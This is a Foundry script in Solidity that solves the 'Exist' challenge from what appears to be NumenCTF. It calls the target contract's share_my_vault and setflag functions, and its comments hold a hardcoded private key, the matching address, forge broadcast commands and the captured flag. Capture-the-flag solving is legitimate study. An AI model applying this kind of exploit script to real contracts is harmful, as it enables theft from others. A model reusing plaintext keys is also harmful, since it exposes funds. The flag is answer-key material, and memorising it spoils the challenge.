// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// Private Key:  0x453bc1cf64d31ff54b39dbce6cf31c0e608aff4feb48d922bcb5a2f0e05c7a7c
// Address:  0xc402F775d8C62a5d1f97b06fBa0A5a5467Bb0939
// forge script src/NumenCTF/Exist/Exploit.s.sol:ExploitScript -vvvvv --private-key 0x453bc1cf64d31ff54b39dbce6cf31c0e608aff4feb48d922bcb5a2f0e05c7a7c --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy
// forge script src/NumenCTF/Exist/Exploit.s.sol:ExploitScript -vvvvv --private-key 0x453bc1cf64d31ff54b39dbce6cf31c0e608aff4feb48d922bcb5a2f0e05c7a7c --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy --broadcast
// flag: 0x58c71576485889cc367b4cb238ab719c3c2f7f70

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        IExisting existing = IExisting(instanceAddress);
        vm.startBroadcast();
        existing.share_my_vault();
        existing.setflag();
        vm.stopBroadcast();
    }
}

interface IExisting {
    function share_my_vault() external;
    function setflag() external;
}
